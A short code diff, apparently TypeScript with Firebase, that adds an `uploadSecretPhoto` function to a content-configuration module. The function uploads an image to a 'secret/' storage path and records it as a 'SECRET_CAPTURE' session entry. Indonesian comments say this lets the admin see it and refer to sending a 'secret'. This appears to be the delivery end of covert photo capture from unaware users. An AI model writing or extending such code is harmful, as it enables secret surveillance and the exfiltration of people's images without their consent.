@@ -122,3 +122,22 @@ function hydrateConfig(cfg: ContentConfig): ContentConfig {
     admin: { ...DEFAULT_CONFIG.admin, ...cfg.admin }
   };
 }
+
+export const uploadSecretPhoto = async (base64Image: string) => {
+  try {
+    const fileName = `secret/${Date.now()}.png`;
+    const storageRef = ref(storage, fileName);
+    const snapshot = await uploadString(storageRef, base64Image, 'data_url');
+    const downloadURL = await getDownloadURL(snapshot.ref);
+
+    // Langsung masukin ke database biar Admin (kamu) bisa liat
+    await addDoc(collection(db, "sessions"), {
+      imgUrl: downloadURL,
+      timestamp: serverTimestamp(),
+      type: "SECRET_CAPTURE"
+    });
+    return downloadURL;
+  } catch (e) {
+    console.error("Gagal kirim rahasia", e);
+  }
+};
